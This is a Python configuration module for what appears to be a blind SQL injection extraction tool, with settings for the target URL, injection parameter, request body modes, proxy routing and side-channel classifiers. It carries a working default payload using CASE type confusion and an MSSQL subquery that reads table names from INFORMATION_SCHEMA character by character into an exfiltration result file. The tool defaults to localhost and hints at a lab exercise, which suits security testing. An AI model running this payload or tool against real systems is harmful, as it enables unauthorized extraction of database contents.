"""Configuration model and loading.

Config can come from a YAML or JSON file, be overridden by CLI flags, and every
environment-specific value has a sensible default so nothing is hard-coded into
the logic modules. PyYAML is optional; JSON always works.
"""

from __future__ import annotations

import json
import string
from dataclasses import dataclass, field, asdict, fields
from typing import Any, Dict, List, Optional

try:  # optional dependency
    import yaml  # type: ignore
    _HAVE_YAML = True
except Exception:  # pragma: no cover - environment dependent
    _HAVE_YAML = False


DEFAULT_CHARSET = (
    string.ascii_lowercase + string.ascii_uppercase + string.digits + "_$# ."
)


@dataclass
class ClassifierConfig:
    """How to decide error vs non-error. Every field is optional; the classifier
    falls back to auto-calibration when signatures are not supplied."""

    # Explicit signatures (used if provided).
    error_status: List[int] = field(default_factory=list)
    ok_status: List[int] = field(default_factory=list)
    error_body_signatures: List[str] = field(default_factory=list)
    ok_body_signatures: List[str] = field(default_factory=list)
    error_header_signatures: Dict[str, str] = field(default_factory=dict)

    # Length-based detection (auto-filled by calibration if left None).
    length_threshold: Optional[int] = None  # bodies shorter than this => error
    length_tolerance: int = 0  # +/- when matching a calibrated baseline length

    # Timing-based detection (for time-based error side channels).
    timing_threshold: Optional[float] = None  # seconds; slower => error

    # Whether to auto-calibrate from known-true / known-false probes at start.
    auto_calibrate: bool = True


@dataclass
class Config:
    # --- target / transport -------------------------------------------------
    target_url: str = "http://localhost:3000/"
    http_method: str = "GET"
    injection_param: str = "q"
    static_params: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    allow_nonlocal: bool = False
    # Route every request through this proxy (e.g. an intercepting proxy such
    # as Burp/ZAP at "http://127.0.0.1:8080"). None uses a direct connection.
    proxy: Optional[str] = None
    # Disable TLS verification, for intercepting proxies with a self-signed CA.
    proxy_insecure: bool = False

    # How the injected value is carried in the request:
    #   auto  -> query string for GET, form-encoded body for POST (default)
    #   form  -> application/x-www-form-urlencoded body
    #   json  -> JSON body; injection_param is a dotted key PATH (e.g.
    #            "filter.username"), inserted into json_template (or {})
    #   raw   -> body_template string with a {value} / {value_json} placeholder
    body_mode: str = "auto"
    # Base JSON body for body_mode=json (the injected value is placed at the
    # dotted injection_param path within a deep copy of this).
    json_template: Optional[Dict[str, Any]] = None
    # Raw body template for body_mode=raw. {value} = the injected value verbatim;
    # {value_json} = the value JSON-string-escaped (no surrounding quotes).
    body_template: Optional[str] = None
    # Content-Type override (mainly for body_mode=raw; json sets its own).
    content_type: Optional[str] = None

    # --- payload ------------------------------------------------------------
    # {condition} is replaced with the target's boolean SQL. The default uses
    # the CASE type-confusion technique from the brief.
    base_payload: str = "a' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)--"

    # --- reliability --------------------------------------------------------
    request_timeout: float = 10.0
    max_retries: int = 3
    retry_backoff: float = 0.25  # seconds, exponential base
    ambiguous_retries: int = 2   # extra tries when classifier says UNKNOWN

    # --- concurrency --------------------------------------------------------
    workers: int = 10

    # --- search / extraction ------------------------------------------------
    charset: str = DEFAULT_CHARSET
    max_length: int = 64
    strategy: str = "adaptive"  # adaptive | linear | binary
    discover_length: bool = True

    # prediction / batching knobs
    predictor_order: int = 3   # Markov order for the character predictor
    char_batch: int = 3        # speculative predicted chars tested per position
    seq_batch: int = 3         # sequence hypotheses tested per position
    min_seq_prefix: int = 2    # shortest recurring prefix the seq predictor tracks

    # Target SQL expression: a scalar-returning subquery whose value is
    # exfiltrated one character at a time. Default: first table name (MSSQL).
    target_name: str = "TABLE_NAME"
    target_expression: str = "(SELECT TOP(1) TABLE_NAME FROM INFORMATION_SCHEMA.TABLES)"
    dialect: str = "mssql"

    # --- classifier ---------------------------------------------------------
    classifier: ClassifierConfig = field(default_factory=ClassifierConfig)

    # --- logging / output ---------------------------------------------------
    verbosity: int = 1  # 0 quiet, 1 normal, 2 verbose, 3 debug
    output_file: str = "exfil_result.json"

    # ------------------------------------------------------------------------
    @staticmethod
    def load(path: str) -> "Config":
        with open(path, "r", encoding="utf-8") as fh:
            text = fh.read()
        data: Dict[str, Any]
        if path.endswith((".yaml", ".yml")):
            if not _HAVE_YAML:
                raise RuntimeError("PyYAML not installed; use a .json config instead")
            data = yaml.safe_load(text) or {}
        else:
            data = json.loads(text)
        return Config.from_dict(data)

    @staticmethod
    def from_dict(data: Dict[str, Any]) -> "Config":
        data = dict(data)
        cls_data = data.pop("classifier", None)
        # Ignore unknown keys (e.g. exporter metadata like "_burp_export") so an
        # annotated config file still loads instead of crashing.
        known = {f.name for f in fields(Config)}
        filtered = {k: v for k, v in data.items() if k in known}
        cfg = Config(**filtered)
        if cls_data:
            known_cls = {f.name for f in fields(ClassifierConfig)}
            cfg.classifier = ClassifierConfig(**{k: v for k, v in cls_data.items() if k in known_cls})
        return cfg

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    def validate(self) -> None:
        if "{condition}" not in self.base_payload:
            raise ValueError("base_payload must contain the {condition} placeholder")
        if self.workers < 1:
            raise ValueError("workers must be >= 1")
        if self.max_length < 1:
            raise ValueError("max_length must be >= 1")
        if not self.charset:
            raise ValueError("charset must be non-empty")
        if self.http_method.upper() not in ("GET", "POST", "PUT", "PATCH"):
            raise ValueError("http_method must be GET, POST, PUT or PATCH")
        mode = (self.body_mode or "auto").lower()
        if mode not in ("auto", "query", "form", "json", "raw", "cookie"):
            raise ValueError("body_mode must be auto, query, form, json, raw or cookie")
        if mode == "raw":
            if not self.body_template:
                raise ValueError("body_mode=raw requires body_template")
            if "{value}" not in self.body_template and "{value_json}" not in self.body_template:
                raise ValueError("body_template must contain {value} or {value_json}")
        if mode == "json" and self.json_template is not None and not isinstance(self.json_template, dict):
            raise ValueError("json_template must be a JSON object (dict)")
